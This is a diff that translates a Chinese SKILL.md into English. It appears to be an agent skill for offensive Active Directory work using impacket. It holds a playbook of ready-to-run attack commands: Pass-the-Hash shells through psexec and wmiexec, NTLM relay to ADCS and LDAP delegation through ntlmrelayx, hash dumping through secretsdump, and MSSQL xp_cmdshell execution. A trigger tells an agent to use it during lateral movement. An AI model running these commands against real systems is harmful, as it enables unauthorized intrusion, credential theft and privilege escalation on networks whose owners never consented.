@@ -2,59 +2,63 @@
 name: impacket-protocol-exec
 description: "impacket scripts perform PTH lateral shells and NTLM relay to ADCS privilege escalation. Signals: lateral movement, psexec."
 zh-signals: "impacket 协议执行脚本集: PTH 横向拿 shell、NTLM 中继到 ADCS 提权。信号:横向移动,psexec。"
+when-to-use: >-
+  Use during Windows or AD lateral movement when you need protocol-based remote
+  execution (psexec, wmiexec, smbexec, atexec, or mssql), Pass-the-Hash, NTLM
+  relay, or DCSync.
 ---
 
-# impacket 协议执行脚本集
+# impacket protocol execution script suite
 
-- 攻击大类:C31 远程服务横向移动
-- 上游仓库:https://github.com/fortra/impacket
-- 上游 License:Apache-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C31 Remote Service Lateral Movement
+- Upstream Repository: https://github.com/fortra/impacket
+- Upstream License: Apache-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/fortra/impacket && cd impacket && pip install .
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `psexec.py` | SMB+服务控制管理器远程 SYSTEM shell |
-| `wmiexec.py` | WMI 半交互 shell(不留文件,日志少) |
-| `smbexec.py` | SMB 共享+ bat 执行的 shell |
-| `dcomexec.py` | DCOM(MMC20/ShellWindows)远程执行 |
-| `atexec.py` | 计划任务远程执行,回显结果 |
-| `mssqlclient.py` | MSSQL 交互客户端(xp_cmdshell 提权执行) |
-| `-hashes LM:NT` | Pass-the-Hash 认证 |
-| `-k / -no-pass` | Kerberos 票据认证 |
-| `ntlmrelayx.py` | NTLM 中继(--delegate-sid / --escalate-user) |
-| `secretsdump.py` | 远程 DCSync/注册表导出哈希 |
-| `smbserver.py` | 恶意 SMB 共享(诱骗窃取哈希) |
+| `psexec.py` | SMB + Service Control Manager remote SYSTEM shell |
+| `wmiexec.py` | WMI semi-interactive shell (no files left behind, few logs) |
+| `smbexec.py` | SMB share + bat execution shell |
+| `dcomexec.py` | DCOM (MMC20/ShellWindows) remote execution |
+| `atexec.py` | Scheduled task remote execution, returns output |
+| `mssqlclient.py` | Interactive MSSQL client (xp_cmdshell privilege escalation execution) |
+| `-hashes LM:NT` | Pass-the-Hash authentication |
+| `-k / -no-pass` | Kerberos ticket authentication |
+| `ntlmrelayx.py` | NTLM relay (--delegate-sid / --escalate-user) |
+| `secretsdump.py` | Remote DCSync / registry hash export |
+| `smbserver.py` | Malicious SMB share (lures victims into leaking hashes) |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### PTH 横向拿 shell
+### Pass-the-Hash lateral shell
 
 ```bash
 impacket-psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NT> administrator@10.0.0.5
 impacket-wmiexec.py -hashes <LM:NT> admin@10.0.0.5
 ```
 
-### NTLM 中继到 ADCS 提权
+### NTLM relay to ADCS for privilege escalation
 
 ```bash
 impacket-ntlmrelayx.py -t http://dc01/certsrv/certfnsh.asp --adcs --smb2support
 impacket-ntlmrelayx.py --delegate-access -t ldap://dc01 -smb2support
 ```
 
-### MSSQL 盲注执行
+### MSSQL blind injection execution
 
 ```bash
 impacket-mssqlclient.py -windows-auth sql_svc@10.0.0.8
 enable_xp_cmdshell; xp_cmdshell whoami
 ```
 
-## 注意事项
+## Notes
 
-现有 skill 仅覆盖 kerberoast/ESC8 两个点,本 skill 补齐协议执行脚本矩阵。脚本名即入口,参数全兼容 Kerberos/哈希/明文三套认证。
+The existing skill only covers kerberoast and ESC8; this skill completes the protocol execution script matrix. The script name is the entry point, and parameters support all three authentication modes: Kerberos, hash, and plaintext.
